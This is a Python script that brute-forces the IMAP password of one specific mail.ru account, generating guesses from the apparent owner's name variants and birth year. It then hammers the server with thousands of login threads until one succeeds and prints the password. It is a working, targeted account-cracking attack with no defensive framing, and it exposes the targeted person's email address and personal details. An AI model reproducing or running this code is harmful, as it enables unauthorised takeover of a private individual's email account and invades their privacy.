import sys,time,socket
import imapclient
import random
import threading

found = set()
pooll = set()
vase = 4100000

def bcdechex(dec):  
    keyspace = ["GuwanchmyratOrazow", "Guwanchmyrat", "Orazow", "Myrat", "Guwanch", "Guwanc", "Murat", "Orazov", "Guvanch", "Guvanc", "GuvanchmyratOrazow", "Guvanchmyrat", "GuvanchmyratOrazov", "guwanchmyratOrazow", "guwanchmyrat", "orazow", "myrat", "guwanch", "guwanc", "murat", "orazov", "guvanch", "guvanc", "guvanchmyratOrazow", "guvanchmyrat", "guvanchmyratOrazov", "Kwanch", "Kwanc", "Kvanch", "Kvanc", "kwanch", "kwanc", "kvanch", "kvanc", "1993", "93", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_"] #"0123456789-_charydinyewvmCHARYDINYEWVM"
    hexin = ''
    while(dec>0):   
        last = dec % len(keyspace)
        hexin = hexin+""+keyspace[last]
        dec = dec//len(keyspace)  
    return hexin


def fill_pooll(no):
    global pooll
    global vase
    with open("last", "w") as myfile:
        myfile.write(str(vase))
    for x in range(no):
        line = bcdechex(vase)
        pooll.add(line)
        vase += 1
        
def checkin(c):
    global pooll
    global found
    password = random.sample(pooll, 1)[0]
    try : 
        server = imapclient.IMAPClient("imap.mail.ru", port=993, use_uid=True, ssl=True, timeout=20)
        server.login("orazow_1993@mail.ru", password)
        print(" +++ Password found  : %s ", password ) 
        found.add(password)
    except imapclient.exceptions.LoginError:
        if (c-len(pooll)) % 100 == 0:
            print("{:,} {:,} {}".format(c,c-len(pooll),password))
        if password in pooll:
            pooll.remove(password)
    except socket.timeout:
        pass
    except ConnectionResetError:
        pass
    except socket.gaierror:
        pass

while len(found)<1:
    if len(pooll) == 0:
        fill_pooll(100000)
    if threading.active_count() < 20024:
        threading.Thread(target = checkin , args = (vase,)).start()



while True:
    if threading.active_count() == 1:
        print("Found")
        print(found)
        break